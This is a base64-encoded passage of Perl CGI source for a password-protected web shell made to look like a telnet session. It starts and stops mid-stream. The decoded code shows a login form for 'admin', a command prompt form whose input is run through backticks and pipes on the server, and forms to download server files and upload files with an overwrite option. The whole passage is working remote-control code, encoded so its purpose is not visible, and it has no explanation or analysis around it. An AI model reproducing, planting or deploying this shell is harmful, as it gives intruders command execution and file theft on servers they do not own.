19fX19fX19fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj58LVxJSUlJSUkvLXw8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fX19fX19fX19fX19fX19fX19fX19fXyZndDs8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPgogICAgICAgIClfLyAgICAgICAgXCAgICAgICAgICAvIAogICAgICAgKEAgICAgICAgICAgIGAtLS0tLS0tLWAKICAgICAgICAgICAgIDwvZm9udD48Zm9udCBjb2xvcj0iI0FFODMwMCI+VyBBIFIgTiBJIE4gRzogUHJpdmF0ZSBTZXJ2ZXI8L2ZvbnQ+PC9wcmU+CiQ7CiMnCglwcmludCA8PEVORDsKPGNvZGU+ClRyeWluZyAkU2VydmVyTmFtZS4uLjxicj4KQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPGJyPgpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dCjxjb2RlPiRNZXNzYWdlCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGNvZGU+Cjxicj5sb2dpbjogYWRtaW48YnI+CnBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9naW5Gb3JtCnsKCXByaW50IDw8RU5EOwo8Y29kZT4KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CmxvZ2luOiBhZG1pbjxicj4KcGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlRm9vdGVyCnsKCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUKIyB2YXJpYWJsZSAkQ29va2llc3snJ30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ291dAp7CglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkmUHJpbnRMb2dvdXRTY3JlZW47CgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0CiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QKIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIKIyB0byBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9naW4gCnsKCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkCgl7CgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoJCX0KCQkmUHJpbnRMb2dpbkZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CiRQcm9tcHQKPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPgokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjwvZm9ybT4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtCnsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KJFByb21wdCB1cGxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPgpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPgpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bwojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMKIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIENvbW1hbmRUaW1lb3V0CnsKCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7CgkJcHJpbnQgPDxFTkQ7CjwveG1wPgo8Y29kZT4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLgo8YnI+S2lsbGVkIGl0IQo8Y29kZT4KRU5ECgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCQlleGl0OwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUKIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMKIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRXhlY3V0ZUNvbW1hbmQKewoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZAoJewoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUKCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4KCQkKCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7CgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOwoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOwoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7Cgl9CgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CgkJcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOwoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsKCQlpZighJFdpbk5UKQoJCXsKCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsKCQkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJCX0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkCgkJewoJCQkkfD0xOwoJCQkkQ29tbWFuZCAuPSAiIHwiOwoJCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQoJCQl7CgkJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJCXByaW50ICIkX1xuIjsKCQkJfQoJCQkkfD0wOwoJCX0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMKCQl7CgkJCXByaW50IGAkQ29tbWFuZGA7CgkJfQoJCWlmKCEkV2luTlQpCgkJewoJCQlhbGFybSgwKTsKCQl9CgkJcHJpbnQgIjwveG1wPiI7Cgl9CgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcgojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaAojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlCnsKCWxvY2FsKCRGaWxlVXJsKSA9IEBfOwoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzCgl7CgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3NlcgoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7CgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJcHJpbnQgPDxFTkQ7Cjxjb2RlPgpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lgo8L2NvZGU+CkVORAoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0Cgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJfQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7CgkJcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCSZQcmludEZpbGVVcGxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJJlByaW50UGFnZUhlYWRlcigiYyIpOwoKCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzCglwcmludCAiPGNvZGU+VXBsb2F